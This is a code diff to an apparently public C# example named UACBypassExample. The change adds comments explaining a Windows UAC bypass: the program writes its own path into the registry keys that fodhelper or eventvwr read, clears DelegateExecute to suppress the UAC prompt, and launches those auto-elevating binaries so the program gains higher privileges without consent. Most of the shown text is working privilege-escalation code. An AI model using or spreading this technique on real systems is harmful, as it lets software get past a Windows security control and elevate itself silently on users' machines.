@@ -59,7 +59,7 @@ namespace UACBypassExample
                   Registry.SetValue(upath[isWin10up ? 0 : 1].RegPath, "", $"{Application.ExecutablePath}" /* put any arguments here if you want. */);
 
                   if (isWin10up)
-                        Registry.SetValue(upath[1].RegPath, "DelegateExecute", "");
+                        Registry.SetValue(upath[1].RegPath, "DelegateExecute", ""); // to disable UAC prompt in executing fodhelper.
                   
 		          // use this if your program is running on 32 bit accessing 64 bit system files.
 		          // it is used to prevent redirection to SysWOW64 when trying to access something
@@ -67,6 +67,9 @@ namespace UACBypassExample
 				  // doesn't even exists there (SysWOW64) somehow.
                   if (Imports.Wow64DisableWow64FsRedirection(out ov))
                   {
+					    // open the process to start your program in higher privileges
+					    // since both fodhelper and eventwvr will open your executable 
+					    // that is located in the registry upon execution.
                         Process.Start(new ProcessStartInfo()
                         {
                             FileName = upath[isWin10up ? 0 : 1].FilePath,
